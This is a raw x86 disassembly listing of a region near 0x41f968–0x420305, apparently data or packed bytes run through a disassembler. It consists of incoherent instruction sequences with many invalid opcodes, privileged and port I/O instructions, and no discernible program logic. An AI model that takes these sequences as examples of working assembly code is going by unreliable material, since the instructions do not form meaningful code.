  41f968:	xchg   ebp,eax
  41f969:	test   eax,0xed54bed3
  41f96e:	pop    edx
  41f96f:	sti    
  41f970:	clc    
  41f971:	mov    esp,0xa68f2267
  41f976:	mov    esi,0xb0d43241
  41f97b:	jl     0x41f9cb
  41f97d:	or     BYTE PTR [esi],bl
  41f97f:	std    
  41f980:	repz stc 
  41f982:	add    ch,BYTE PTR ss:[ecx]
  41f985:	aam    0xd1
  41f987:	jbe    0x41f9b7
  41f989:	push   edi
  41f98a:	cli    
  41f98b:	and    BYTE PTR [edx],ch
  41f98d:	adc    ecx,DWORD PTR [ebx]
  41f98f:	mov    dh,0x71
  41f991:	push   esi
  41f992:	pop    ss
  41f993:	stc    
  41f994:	(bad)  
  41f995:	loopne 0x41fa0a
  41f997:	mov    ebp,0x35b08885
  41f99c:	sub    edx,DWORD PTR [ecx+0x68]
  41f99f:	xchg   edx,eax
  41f9a0:	inc    ebx
  41f9a1:	ficom  DWORD PTR [ecx]
  41f9a3:	test   eax,0x586a7879
  41f9a8:	enter  0x2fb4,0x33
  41f9ac:	jg     0x41fa23
  41f9ae:	inc    edi
  41f9af:	fisub  DWORD PTR [esi+0x734ceb06]
  41f9b5:	sbb    cl,cl
  41f9b7:	pop    ecx
  41f9b8:	jae    0x41f9fc
  41f9ba:	jecxz  0x41fa21
  41f9bc:	les    ebp,FWORD PTR [ecx+0x54]
  41f9bf:	inc    edi
  41f9c0:	out    dx,al
  41f9c1:	mov    ch,BYTE PTR [edx]
  41f9c3:	mov    esi,0xc5426a2f
  41f9c8:	xor    edi,esp
  41f9ca:	cmc    
  41f9cb:	mov    ch,BYTE PTR [edx+edi*8-0x3146eeb7]
  41f9d2:	daa    
  41f9d3:	cmp    eax,0x65ce4faa
  41f9d8:	jb     0x41f967
  41f9da:	les    edx,FWORD PTR [eax-0x63246c41]
  41f9e0:	add    al,BYTE PTR [eax-0x75]
  41f9e3:	into   
  41f9e4:	sbb    dh,ah
  41f9e6:	adc    esp,DWORD PTR ds:0xd8265171
  41f9ec:	add    BYTE PTR [eax],bh
  41f9ee:	jp     0x41f9be
  41f9f0:	mov    bh,0x75
  41f9f2:	(bad)  
  41f9f3:	sbb    ch,BYTE PTR [esp+eiz*2]
  41f9f6:	ins    DWORD PTR es:[edi],dx
  41f9f7:	js     0x41f98a
  41f9f9:	add    al,0xa0
  41f9fb:	mov    esp,0x875fc312
  41fa00:	int3   
  41fa01:	cld    
  41fa02:	push   edx
  41fa03:	dec    ecx
  41fa04:	push   ebx
  41fa05:	mov    edx,0x232847f
  41fa0a:	inc    ebx
  41fa0b:	dec    ebx
  41fa0c:	jne    0x41fa5c
  41fa0e:	mov    ch,0xcd
	...
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0xca5c7d2e
  41fa84:	rcl    BYTE PTR [eax+0x1],1
  41fa87:	add    BYTE PTR [ecx+eax*1],al
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	mov    DWORD PTR [edi],edi
  41fa8e:	neg    cl
  41fa90:	adc    dl,ah
  41fa92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa93:	mov    esi,0xf76e5e94
  41fa98:	fs pop ebx
  41fa9a:	push   ebp
  41fa9b:	ja     0x41fa30
  41fa9d:	sahf   
  41fa9e:	sbb    BYTE PTR [ebx-0x41],ch
  41faa1:	shl    DWORD PTR [eax+0x59826220],1
  41faa7:	and    eax,0x9616ef6
  41faac:	xchg   ecx,eax
  41faad:	add    cl,BYTE PTR [esi+0x24]
  41fab0:	dec    edx
  41fab1:	cdq    
  41fab2:	and    eax,0xd0367eb
  41fab7:	mov    eax,0x345d0433
  41fabc:	cmp    BYTE PTR [ebp-0x23304517],bl
  41fac2:	inc    esp
  41fac3:	push   ecx
  41fac4:	jp     0x41fb31
  41fac6:	shr    BYTE PTR [edx],cl
  41fac8:	cmp    DWORD PTR ds:0x63d54478,edi
  41face:	fld    QWORD PTR [ebx+0x3c]
  41fad1:	lahf   
  41fad2:	dec    eax
  41fad3:	xchg   esi,eax
  41fad4:	mov    ss,WORD PTR [ecx]
  41fad6:	ins    DWORD PTR es:[edi],dx
  41fad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fad8:	sti    
  41fad9:	cld    
  41fada:	div    DWORD PTR [ebp+ebx*8+0x25d11b18]
  41fae1:	imul   ebx,DWORD PTR [edi+0x22],0xdcffe1f6
  41fae8:	imul   ebx,DWORD PTR [eax-0x63333e12],0x68f0570f
  41faf2:	add    DWORD PTR [esi],ebp
  41faf4:	aad    0xe6
  41faf6:	(bad)  
  41faf7:	loopne 0x41fb65
  41faf9:	enter  0x52fb,0x34
  41fafd:	sub    al,0x48
  41faff:	and    dh,BYTE PTR [ebx-0x49f5f0f5]
  41fb05:	or     dl,bh
  41fb07:	sub    DWORD PTR [edx+0x7c55482c],ebx
  41fb0d:	mov    bl,0x42
  41fb0f:	jmp    0x41faeb
  41fb11:	inc    edx
  41fb12:	mov    cl,0x3f
  41fb14:	sub    ebx,DWORD PTR [ebp+0x422ab9f8]
  41fb1a:	sub    ah,BYTE PTR ds:0x3b561965
  41fb20:	dec    ebp
  41fb21:	inc    ebp
  41fb22:	gs xchg esp,eax
  41fb24:	pop    ecx
  41fb25:	mov    cl,BYTE PTR [edi-0x72]
  41fb28:	jmp    0x65df:0x9880ab38
  41fb2f:	jecxz  0x41faf2
  41fb31:	add    al,0x16
  41fb33:	inc    esi
  41fb34:	hlt    
  41fb35:	rcr    BYTE PTR [edx+0x1e],0xed
  41fb39:	jmp    FWORD PTR [ebx-0x1d]
  41fb3c:	fsubr  DWORD PTR [ebx-0x58e166c1]
  41fb42:	imul   ebx,DWORD PTR [ebp+0x54],0x31
  41fb46:	adc    cl,ah
  41fb48:	and    bl,BYTE PTR [eax+0x1d]
  41fb4b:	(bad)  
  41fb4c:	cmp    al,0xbc
  41fb4e:	xchg   ecx,eax
  41fb4f:	mov    dh,0x22
  41fb51:	sbb    ebx,DWORD PTR [esp+ecx*1]
  41fb54:	adc    BYTE PTR [esi+edi*8],ah
  41fb57:	sub    BYTE PTR [edi+0x4a],bl
  41fb5a:	push   cs
  41fb5b:	sahf   
  41fb5c:	das    
  41fb5d:	jo     0x41faef
  41fb5f:	ds jge 0x41fae8
  41fb62:	jecxz  0x41fb1e
  41fb64:	out    0xfd,eax
  41fb66:	jne    0x41fb90
  41fb68:	sti    
  41fb69:	sbb    DWORD PTR [edx],ebx
  41fb6b:	pop    edx
  41fb6c:	or     eax,0xd6582042
  41fb71:	xchg   ecx,eax
  41fb72:	js     0x41fb6f
  41fb74:	(bad)  
  41fb76:	aaa    
  41fb77:	aas    
  41fb78:	xchg   edi,eax
  41fb79:	pop    ecx
  41fb7a:	mov    dl,0x22
  41fb7c:	in     eax,0x4d
  41fb7e:	mov    dh,0x74
  41fb80:	xchg   edi,eax
  41fb81:	dec    ecx
  41fb82:	push   ebx
  41fb83:	pop    eax
  41fb84:	cld    
  41fb85:	(bad)  
  41fb86:	and    al,0x64
  41fb88:	inc    ebx
  41fb89:	xor    al,0x67
  41fb8b:	(bad)  
  41fb8c:	(bad)  
  41fb8d:	push   edi
  41fb8e:	xor    al,BYTE PTR ds:[eax]
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	jg     0x41fc05
  41fc02:	jmp    0x41fb99
  41fc04:	aam    0x51
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	mov    dh,0x71
  41fc0e:	dec    edx
  41fc0f:	cmp    bh,BYTE PTR [edi+0x4700ead1]
  41fc15:	push   edx
  41fc16:	mov    DWORD PTR [eax-0x38f7304a],ecx
  41fc1c:	jg     0x41fbc4
  41fc1e:	jns    0x41fc5e
  41fc20:	lar    ecx,WORD PTR [esi-0x6c]
  41fc24:	ins    DWORD PTR es:[edi],dx
  41fc25:	add    dl,dh
  41fc27:	xor    al,0x33
  41fc29:	dec    eax
  41fc2a:	xor    esi,ecx
  41fc2c:	js     0x41fbd1
  41fc2e:	mov    dh,0x81
  41fc30:	xchg   edi,eax
  41fc31:	sar    BYTE PTR [eax],1
  41fc33:	xor    edi,edi
  41fc35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc36:	mov    ds:0x7f3cf868,al
  41fc3b:	repz fsubr QWORD PTR ds:0x1482082d
  41fc42:	fcom   DWORD PTR [edi]
  41fc44:	cdq    
  41fc45:	and    BYTE PTR [edi+0x4419e5dc],bh
  41fc4b:	stc    
  41fc4c:	mov    ds:0xf34453af,al
  41fc51:	ret    
  41fc52:	mov    dh,0x95
  41fc54:	stc    
  41fc55:	and    BYTE PTR [ecx+edi*4],0xf6
  41fc59:	mov    bh,0x7f
  41fc5b:	mov    eax,ds:0x8315f3a8
  41fc60:	lds    edx,FWORD PTR [ecx-0x11f8f63e]
  41fc66:	in     al,dx
  41fc67:	shl    BYTE PTR [edi+0x38],0x7c
  41fc6b:	add    bl,BYTE PTR [edi-0x30384cd6]
  41fc71:	rdtsc  
  41fc73:	arpl   WORD PTR [esi-0x6a4ab563],cx
  41fc79:	jmp    0x41fc9b
  41fc7b:	fistp  QWORD PTR [ebp+0x6b]
  41fc7e:	(bad)  [ebp-0x59443520]
  41fc84:	ret    0x2658
  41fc87:	add    eax,0x16082bab
  41fc8c:	loop   0x41fc7a
  41fc8e:	lahf   
  41fc8f:	mov    dl,0xe8
  41fc91:	push   0x30ed5ce8
  41fc96:	pop    ecx
  41fc97:	cmp    edi,ebp
  41fc99:	add    DWORD PTR [ebx-0x6f9bf920],ecx
  41fc9f:	popa   
  41fca0:	xchg   edx,eax
  41fca1:	cld    
  41fca2:	jnp    0x41fc82
  41fca4:	dec    eax
  41fca5:	push   esp
  41fca6:	xor    ch,BYTE PTR [edi-0x40]
  41fca9:	inc    eax
  41fcaa:	inc    edi
  41fcab:	dec    cl
  41fcad:	enter  0x6fa,0x87
  41fcb1:	jnp    0x41fc4d
  41fcb3:	and    edx,eax
  41fcb5:	mov    al,0x95
  41fcb7:	stos   BYTE PTR es:[edi],al
  41fcb8:	xchg   edx,eax
  41fcb9:	xor    BYTE PTR [ecx+0x18e7d3b9],dh
  41fcbf:	xor    al,0x49
  41fcc1:	stos   BYTE PTR es:[edi],al
  41fcc2:	mov    al,0x56
  41fcc4:	jnp    0x41fc4b
  41fcc6:	out    dx,al
  41fcc7:	rcr    DWORD PTR [edx],1
  41fcc9:	call   0x25d:0xa13917a1
  41fcd0:	ds and al,0xa4
  41fcd3:	dec    ebx
  41fcd4:	push   eax
  41fcd5:	mov    edi,DWORD PTR [ecx+0x6e741e]
  41fcdb:	sysexit 
  41fcdd:	clc    
  41fcde:	pushf  
  41fcdf:	outs   dx,DWORD PTR ds:[esi]
  41fce0:	or     al,0xd9
  41fce2:	ds mov ebp,0x7d75d970
  41fce8:	pop    ecx
  41fce9:	jp     0x41fd36
  41fceb:	xor    al,0x71
  41fced:	mov    al,0x1c
  41fcef:	scas   al,BYTE PTR es:[edi]
  41fcf0:	sahf   
  41fcf1:	pop    es
  41fcf2:	sub    al,0xc3
  41fcf4:	xor    eax,0xa73e477a
  41fcf9:	mov    bh,0xe1
  41fcfb:	in     eax,dx
  41fcfc:	or     bh,BYTE PTR [esi-0x28]
  41fcff:	ficom  WORD PTR [eax]
  41fd01:	fwait
  41fd02:	in     al,0x4d
  41fd04:	mov    ah,0x51
  41fd06:	jnp    0x41fce1
  41fd08:	data16 hlt 
  41fd0a:	and    al,bh
  41fd0c:	xchg   BYTE PTR [ebx],ah
  41fd0e:	add    edx,DWORD PTR [edx]
	...
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	out    0xe4,al
  41fd82:	retf   0xd89d
  41fd85:	push   edx
  41fd86:	add    DWORD PTR [eax],eax
  41fd88:	add    al,0x1
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	cmp    bh,BYTE PTR [edi]
  41fd8e:	sub    ch,bh
  41fd90:	adc    DWORD PTR [esi+0x77e9e766],edx
  41fd96:	pop    esp
  41fd97:	and    dl,BYTE PTR [esi]
  41fd99:	xchg   ebp,eax
  41fd9a:	sbb    al,0xa2
  41fd9c:	inc    ecx
  41fd9d:	add    al,0xd5
  41fd9f:	daa    
  41fda0:	gs in  al,0x9e
  41fda3:	shl    DWORD PTR [eax],1
  41fda5:	imul   esp,eax,0xf6b93064
  41fdab:	add    DWORD PTR [edi+0x66],0xad0347b6
  41fdb2:	in     al,0x12
  41fdb4:	push   esi
  41fdb5:	leave  
  41fdb6:	dec    ecx
  41fdb7:	inc    esi
  41fdb8:	xor    al,0x51
  41fdba:	add    al,0x37
  41fdbc:	mov    dl,0x3f
  41fdbe:	fcomi  st,st(7)
  41fdc0:	retf   0x8b93
  41fdc3:	push   ds
  41fdc4:	push   esp
  41fdc5:	jle    0x41fdcb
  41fdc7:	and    BYTE PTR [ebp+0x27],0x31
  41fdcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdcc:	movzx  ebp,WORD PTR [edx]
  41fdcf:	call   0x99e1ed60
  41fdd4:	icebp  
  41fdd5:	pop    ecx
  41fdd6:	xchg   esi,eax
  41fdd7:	and    ah,BYTE PTR [ecx-0x13ce12b1]
  41fddd:	mov    bl,0x82
  41fddf:	jb     0x41fe1d
  41fde1:	loop   0x41fdbd
  41fde3:	jmp    0x41fe15
  41fde5:	dec    ecx
  41fde6:	arpl   WORD PTR [eax+0x43],ax
  41fde9:	int3   
  41fdea:	int    0xb7
  41fdec:	pop    ebp
  41fded:	lods   al,BYTE PTR ds:[esi]
  41fdee:	jle    0x41fdc6
  41fdf0:	test   edi,0x2e9b8748
  41fdf6:	xchg   ecx,eax
  41fdf7:	ins    DWORD PTR es:[edi],dx
  41fdf8:	cli    
  41fdf9:	jb     0x41fde8
  41fdfb:	mov    al,ds:0x5dbd9e7b
  41fe00:	ror    bl,0x6d
  41fe03:	cld    
  41fe04:	std    
  41fe05:	inc    esp
  41fe06:	into   
  41fe07:	fisubr WORD PTR [edx+0x52]
  41fe0a:	push   ds
  41fe0b:	(bad)  
  41fe0d:	mov    bl,0xde
  41fe0f:	loopne 0x41fdc7
  41fe11:	outs   dx,DWORD PTR ds:[esi]
  41fe12:	mov    dl,0x91
  41fe14:	mov    ebx,0x9df53f89
  41fe19:	fcmovb st,st(4)
  41fe1b:	push   ebp
  41fe1c:	jbe    0x41fdd3
  41fe1e:	add    al,0xc2
  41fe20:	test   DWORD PTR [esi],esi
  41fe22:	rcr    dh,0x67
  41fe25:	aam    0x2f
  41fe27:	loopne 0x41fe27
  41fe29:	sbb    al,0xef
  41fe2b:	arpl   WORD PTR [edi+ebp*8+0x73],dx
  41fe2f:	hlt    
  41fe30:	(bad)  
  41fe31:	cli    
  41fe32:	jmp    0x41fe6d
  41fe34:	arpl   WORD PTR [esi],sp
  41fe36:	sbb    DWORD PTR [edi+0x77],ecx
  41fe39:	push   ebp
  41fe3a:	push   ecx
  41fe3b:	nop
  41fe3c:	in     eax,0x77
  41fe3e:	ins    BYTE PTR es:[edi],dx
  41fe3f:	test   DWORD PTR [edx],esp
  41fe41:	lods   al,BYTE PTR ds:[esi]
  41fe42:	inc    ecx
  41fe43:	rcr    esi,1
  41fe45:	mov    ah,0xa
  41fe47:	icebp  
  41fe48:	out    dx,al
  41fe49:	jg     0x41fe22
  41fe4b:	xchg   esp,eax
  41fe4c:	in     al,0xd6
  41fe4e:	shl    al,cl
  41fe50:	dec    esi
  41fe51:	jmp    0x182e:0x1383a5be
  41fe58:	test   ebx,0xbdd72403
  41fe5e:	repz fwait
  41fe60:	jecxz  0x41fdee
  41fe62:	mov    bl,0x9b
  41fe64:	mov    bl,0x12
  41fe66:	clc    
  41fe67:	ins    BYTE PTR es:[edi],dx
  41fe68:	es (bad) 
  41fe6a:	lds    edx,FWORD PTR gs:[edi-0x4c9e23b3]
  41fe71:	mov    ?,WORD PTR [ecx-0x632009a9]
  41fe77:	jns    0x41fe35
  41fe79:	ja     0x41fef9
  41fe7b:	test   al,0xad
  41fe7d:	out    dx,eax
  41fe7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe80:	pop    esp
  41fe81:	(bad)  
  41fe82:	cdq    
  41fe83:	fucomi st,st(4)
  41fe85:	pushf  
  41fe86:	mov    eax,0xf762412a
  41fe8b:	pop    ss
  41fe8c:	enter  0x4071,0xb6
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x8c
  41ff01:	(bad)  
  41ff03:	loope  0x41fee1
  41ff05:	push   ebx
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    al,0x1
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	ins    BYTE PTR es:[edi],dx
  41ff0d:	pop    esp
  41ff0e:	dec    eax
  41ff0f:	xor    al,BYTE PTR [eax]
  41ff11:	es aam 0x3a
  41ff14:	pop    ss
  41ff15:	ss xchg ebp,eax
  41ff17:	sahf   
  41ff18:	pushf  
  41ff19:	je     0x41fea1
  41ff1b:	mov    bh,0xc0
  41ff1d:	add    dh,BYTE PTR [esp+eiz*2]
  41ff20:	out    0x77,al
  41ff22:	sbb    BYTE PTR [edi],dh
  41ff24:	mov    eax,DWORD PTR [edi-0x5951dd04]
  41ff2a:	add    ecx,edx
  41ff2c:	inc    edx
  41ff2d:	retf   0x16cd
  41ff30:	ja     0x41ffad
  41ff32:	xor    BYTE PTR [edx-0x3e2e3753],ch
  41ff38:	call   0xc386:0x687d61d6
  41ff3f:	ds jno 0x41fee2
  41ff42:	mov    WORD PTR [edi+ebp*8],?
  41ff45:	mov    al,ah
  41ff47:	xchg   DWORD PTR [esi-0x1c],ebx
  41ff4a:	test   DWORD PTR [ebx+0x78a59246],ecx
  41ff50:	int3   
  41ff51:	pop    esp
  41ff52:	mov    eax,edx
  41ff54:	mov    WORD PTR [ebp+0x6338bd79],es
  41ff5a:	stos   BYTE PTR es:[edi],al
  41ff5b:	lahf   
  41ff5c:	loop   0x41ff45
  41ff5e:	mov    cl,0xaa
  41ff60:	adc    bl,BYTE PTR [esi+0xa]
  41ff63:	xlat   BYTE PTR ds:[ebx]
  41ff64:	je     0x41ff6c
  41ff66:	fcomp  QWORD PTR [eax+0x26]
  41ff69:	jl     0x41ff6e
  41ff6b:	stc    
  41ff6c:	push   eax
  41ff6d:	cmp    ah,BYTE PTR [esi+0x0]
  41ff70:	(bad)  
  41ff72:	pop    ecx
  41ff73:	ja     0x41ff47
  41ff75:	jp     0x41ff91
  41ff77:	imul   BYTE PTR [ecx]
  41ff79:	sub    BYTE PTR [edx],dh
  41ff7b:	(bad)  
  41ff7c:	out    dx,eax
  41ff7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff7e:	pusha  
  41ff7f:	aas    
  41ff80:	stos   DWORD PTR es:[edi],eax
  41ff81:	lock xchg edx,eax
  41ff83:	sti    
  41ff84:	or     ebx,DWORD PTR [ebp+0xf]
  41ff87:	mov    bl,0x32
  41ff89:	sbb    eax,0x9a0cf630
  41ff8e:	dec    edi
  41ff8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff90:	cdq    
  41ff91:	push   0xffffffb0
  41ff93:	stos   BYTE PTR es:[edi],al
  41ff94:	ret    0x6afd
  41ff97:	aas    
  41ff98:	adc    DWORD PTR [eax+0x60],eax
  41ff9b:	add    edi,DWORD PTR [edx+0x3b384792]
  41ffa1:	sub    eax,0xfc169a4e
  41ffa6:	cmp    DWORD PTR [ebx],ebp
  41ffa8:	jl     0x41ffc7
  41ffaa:	(bad)  
  41ffac:	mov    DWORD PTR [esi-0x48d7522f],eax
  41ffb2:	shr    BYTE PTR [edx+0x49],cl
  41ffb5:	push   ecx
  41ffb6:	lea    ecx,[edi-0x46586da7]
  41ffbc:	dec    ebp
  41ffbd:	ds jnp 0x41ff72
  41ffc0:	shl    ecx,1
  41ffc2:	mov    edx,0xcf1982b8
  41ffc7:	(bad)  
  41ffc8:	out    dx,al
  41ffc9:	jne    0x41ff97
  41ffcb:	pushf  
  41ffcc:	xor    BYTE PTR [ebp+0xf],bl
  41ffcf:	imul   esp,DWORD PTR ds:0x984e5fc2,0x3ccefce7
  41ffd9:	jmp    0x86a6f7c
  41ffde:	mov    eax,0xc0f1f2d2
  41ffe3:	fs test al,0xf7
  41ffe6:	(bad)
  41ffe9:	xlat   BYTE PTR ds:[ebx]
  41ffea:	jo     0x42002a
  41ffec:	nop
  41ffed:	pop    ebx
  41ffee:	and    DWORD PTR ds:0xd634bef0,edi
  41fff4:	pop    ecx
  41fff5:	xchg   esi,eax
  41fff6:	out    dx,al
  41fff7:	sub    al,0x4d
  41fff9:	aas    
  41fffa:	retf   0x46e7
  41fffd:	sbb    DWORD PTR [edx],0x4
  420000:	(bad)  
  420001:	and    esi,DWORD PTR [edx+ecx*2-0x24ed603f]
  420008:	out    dx,al
  420009:	fwait
  42000a:	or     DWORD PTR [ebx-0x1ac64107],0x0
	...
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x1
  420081:	retf   0x568a
  420084:	loopne 0x4200da
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	inc    ebx
  42008d:	mov    al,0x64
  42008f:	jmp    0x3656d372
  420094:	ja     0x4200a8
  420096:	mov    ch,0x1f
  420098:	das    
  420099:	cwde   
  42009a:	lahf   
  42009b:	(bad)  
  42009c:	push   DWORD PTR [ebx+0x6b]
  42009f:	fmul   DWORD PTR [ecx]
  4200a1:	test   al,0xef
  4200a3:	(bad)  
  4200a6:	xchg   esi,eax
  4200a7:	test   al,0x59
  4200a9:	ins    DWORD PTR es:[edi],dx
  4200aa:	lds    edi,FWORD PTR [esi]
  4200ac:	scas   al,BYTE PTR es:[edi]
  4200ad:	js     0x4200d6
  4200af:	fwait
  4200b0:	enter  0x1512,0x46
  4200b4:	jne    0x4200bb
  4200b6:	add    BYTE PTR [edi-0x7],ch
  4200b9:	mov    DWORD PTR [esi+0x36e2b304],ebp
  4200bf:	xchg   ebp,eax
  4200c0:	mov    BYTE PTR [esp+eiz*8],dl
  4200c3:	mov    edx,0x80635801
  4200c8:	xchg   DWORD PTR [ecx+edx*4+0x394f1027],esi
  4200cf:	fist   DWORD PTR [ebx+0x51]
  4200d2:	xor    eax,0x127cdaec
  4200d7:	div    ecx
  4200d9:	popf   
  4200da:	in     al,dx
  4200db:	push   ebp
  4200dc:	push   cs
  4200dd:	adc    BYTE PTR [ebx],ah
  4200df:	dec    esi
  4200e0:	test   BYTE PTR [edi],bl
  4200e2:	pop    ebx
  4200e3:	dec    ebp
  4200e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200e5:	jbe    0x420101
  4200e7:	and    BYTE PTR [eax],0x83
  4200ea:	ss sti 
  4200ec:	mul    esi
  4200ee:	call   0xebbcc2a8
  4200f3:	stos   BYTE PTR es:[edi],al
  4200f4:	pop    edi
  4200f6:	fidivr DWORD PTR [eax]
  4200f8:	mov    ebp,0x35272029
  4200fd:	and    edi,0x1f
  420100:	pop    edi
  420101:	leave  
  420102:	mov    edi,0x2809282c
  420107:	adc    BYTE PTR ds:0xd0206752,al
  42010d:	mov    DWORD PTR [edx+ecx*1-0x27],0xba773641
  420115:	and    bh,al
  420117:	call   0xee34:0x4ad1c90c
  42011e:	popf   
  42011f:	xchg   ebp,eax
  420120:	adc    eax,0xd7a088ba
  420125:	xlat   BYTE PTR ds:[ebx]
  420126:	jmp    0x42015d
  420128:	ins    BYTE PTR es:[edi],dx
  420129:	cdq    
  42012a:	lds    esp,FWORD PTR gs:[ebp+0x74]
  42012e:	mov    bl,0x4
  420130:	addr16 dec ebp
  420132:	cmp    eax,0x8daf3d60
  420137:	mov    al,ds:0x42e3bde1
  42013c:	dec    ebx
  42013d:	repz shr BYTE PTR [esi-0x65cba07e],0xbb
  420145:	sahf   
  420146:	push   edi
  420147:	and    bh,ch
  420149:	outs   dx,BYTE PTR ds:[esi]
  42014a:	stc    
  42014b:	mov    dh,0x35
  42014d:	(bad)  [edi]
  42014f:	or     esi,edi
  420151:	push   ecx
  420152:	fidivr DWORD PTR [ecx-0x6d18a0e2]
  420158:	daa    
  420159:	dec    BYTE PTR [ebx+0x59]
  42015c:	jnp    0x42014e
  42015e:	sti    
  42015f:	fiadd  WORD PTR [ecx]
  420161:	add    bh,ch
  420163:	adc    al,0x54
  420165:	sbb    al,0x4c
  420167:	xchg   DWORD PTR [ecx],ebx
  420169:	and    DWORD PTR [edx],esi
  42016b:	div    DWORD PTR [ebx]
  42016d:	xor    al,0x24
  42016f:	sub    al,0x80
  420171:	js     0x420164
  420173:	imul   ebx,DWORD PTR [esp+ebx*4-0x6d4ca751],0xfffffff3
  42017b:	rcl    DWORD PTR [eax-0x3b],0xfb
  42017f:	dec    eax
  420180:	sti    
  420181:	mov    edi,0x53456de5
  420186:	test   DWORD PTR [esi],esi
  420188:	xchg   edx,eax
  420189:	pushf  
  42018a:	jns    0x4201d2
  42018c:	sub    al,0x15
  42018e:	jb     0x4201f4
	...
  4201f4:	jae    0x4201c5
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx-0x756ecf4],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	jmp    0x42026e
  42020e:	mov    bl,0x88
  420210:	sub    ebp,DWORD PTR [edi+0x6648bf7a]
  420216:	and    ebp,ebx
  420218:	fidivr DWORD PTR [edi+0x40]
  42021b:	cmp    BYTE PTR [esp+eax*2],0xfa
  42021f:	mov    bh,0xc0
  420221:	adc    al,0x3
  420223:	(bad)  
  420225:	(bad)  
  420226:	cmp    dh,bl
  420228:	div    DWORD PTR [ebx+0x15]
  42022b:	das    
  42022c:	add    eax,DWORD PTR [edi-0x7e]
  42022f:	dec    ebx
  420230:	call   0x8f70:0xd4fb9236
  420237:	xlat   BYTE PTR ds:[ebx]
  420238:	pop    edx
  420239:	pop    edx
  42023a:	cmp    dl,bh
  42023c:	add    al,0x2
  42023e:	mov    BYTE PTR [ebx+0x52df7ff9],ch
  420244:	pop    edx
  420245:	xor    DWORD PTR [esi+0x66f4c1e7],eax
  42024b:	pop    edx
  42024c:	shl    DWORD PTR [ebx+eax*4],cl
  42024f:	sbb    eax,0x9c0d508c
  420254:	shr    DWORD PTR [ebp+0x11fa3c15],cl
  42025a:	push   eax
  42025b:	shl    DWORD PTR [ebx+0x2120ceb2],1
  420261:	push   0x405dd455
  420266:	cmp    eax,0x922fae9
  42026b:	mov    esp,0x8f775a77
  420270:	cmp    esi,esi
  420272:	mov    bl,0xf6
  420274:	pop    ebx
  420275:	dec    esi
  420276:	xor    al,0xd0
  420278:	rcr    BYTE PTR [esi-0x2cf19041],0x40
  42027f:	xor    al,0x4a
  420281:	in     al,0x91
  420283:	pop    esp
  420284:	cmc    
  420285:	fld    TBYTE PTR [edx]
  420287:	sysret 
  420289:	mov    ah,0x1
  42028b:	dec    esp
  42028c:	add    DWORD PTR [edx+edi*1+0x47],edx
  420290:	adc    edi,ecx
  420292:	jmp    0x42cd349a
  420297:	fiadd  DWORD PTR [ecx-0x12]
  42029a:	dec    ebx
  42029b:	jb     0x4202df
  42029d:	mov    edi,0x25bf4e4a
  4202a2:	xor    esi,DWORD PTR [edx-0x71]
  4202a5:	mov    bl,0x52
  4202a7:	shr    DWORD PTR [edi+eax*2+0x5dc1981c],1
  4202ae:	mov    bh,0xee
  4202b0:	leave  
  4202b1:	inc    eax
  4202b2:	jbe    0x420319
  4202b4:	gs call 0x5c0e1208
  4202ba:	push   ds
  4202bb:	(bad)  
  4202bc:	je     0x42031b
  4202be:	fidiv  DWORD PTR [ebx+0x6d]
  4202c1:	test   eax,0x693f0ae2
  4202c6:	jge    0x4202d2
  4202c8:	scas   al,BYTE PTR es:[edi]
  4202c9:	mov    DWORD PTR [ebp*8-0x51cecd4e],ebp
  4202d0:	push   cs
  4202d1:	(bad)  
  4202d4:	mov    ebp,0x406beb0e
  4202d9:	and    DWORD PTR [esi-0x38],esi
  4202dc:	in     al,0x2f
  4202de:	add    esp,DWORD PTR [esi+ecx*4-0x7b]
  4202e2:	dec    ebp
  4202e3:	mov    al,ds:0x49e6b302
  4202e8:	ins    DWORD PTR es:[edi],dx
  4202e9:	fisubr DWORD PTR ds:[edx+0x6cf70a0c]
  4202f0:	call   0x6984:0xb94b3cbc
  4202f7:	shr    DWORD PTR [esp+esi*1],0xc1
  4202fb:	dec    ebx
  4202fc:	push   ecx
  4202fd:	js     0x4202de
  4202ff:	mov    ebx,0xacec3efc
  420304:	dec    ebp
  420305:	adc    DWORD PTR [ebp-0x1a],esi
